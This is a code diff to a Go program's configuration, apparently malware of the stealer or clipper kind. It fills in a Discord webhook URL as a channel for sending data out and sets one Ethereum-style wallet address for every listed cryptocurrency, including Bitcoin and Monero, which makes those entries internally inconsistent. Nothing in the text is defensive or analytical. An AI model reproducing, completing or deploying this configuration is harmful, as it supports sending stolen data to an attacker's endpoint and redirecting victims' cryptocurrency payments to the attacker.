@@ -23,19 +23,19 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discord.com/api/webhooks/1568311693401129057/B0xmVhoD9THH9gfyu9wvjPxcW1N3mxndEX9UH7qfc7EOgZnUROAnNIkIOVpA8jxKxUrV",
 		"cryptos": map[string]string{
-			"BTC": "",
-			"BCH": "",
-			"ETH": "",
-			"XMR": "",
-			"LTC": "",
-			"XCH": "",
-			"XLM": "",
-			"TRX": "",
-			"ADA": "",
-			"DASH": "",
-			"DOGE": "",
+			"BTC": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"BCH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"ETH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"XMR": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"LTC": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"XCH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"XLM": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"TRX": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"ADA": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"DASH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
+			"DOGE": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
 		},
 	}
 
